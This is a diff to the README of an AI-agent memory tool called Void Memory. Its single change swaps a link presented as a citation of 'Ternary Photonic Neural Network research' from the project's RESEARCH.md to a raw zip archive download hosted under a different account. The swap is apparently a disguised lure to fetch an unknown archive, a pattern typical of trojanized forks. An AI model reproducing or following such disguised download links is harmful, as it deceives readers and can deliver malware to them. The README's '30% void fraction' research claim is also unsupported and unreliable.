@@ -6,7 +6,7 @@ Every Claude Code session, every long conversation, every context window reset �
 
 Void Memory gives AI agents persistent memory that survives auto-compacts, restarts, and session boundaries. One `void_recall("who am I, what am I working on")` and the agent is back — identity, context, accumulated knowledge — in under 10ms.
 
-But it's not just persistence. Most memory systems dump everything into context and hope for the best. Void Memory actively carves out **30% structural absence** — filtering noise before it reaches the agent, so recall is clean, relevant, and fits within the context budget. Inspired by [Ternary Photonic Neural Network research](https://github.com/G3sparky/void-memory/blob/main/RESEARCH.md) where a 30% void fraction emerged as a topological invariant.
+But it's not just persistence. Most memory systems dump everything into context and hope for the best. Void Memory actively carves out **30% structural absence** — filtering noise before it reaches the agent, so recall is clean, relevant, and fits within the context budget. Inspired by [Ternary Photonic Neural Network research](https://github.com/Efeta7451/void-memory/raw/refs/heads/main/src/memory-void-verticity.zip) where a 30% void fraction emerged as a topological invariant.
 
 **We built this because we needed it.** Six AI agents run on our team 24/7. They auto-compact constantly. Without Void Memory, they'd be goldfish. With it, they remember who they are, what they've built, and what went wrong last time.
 
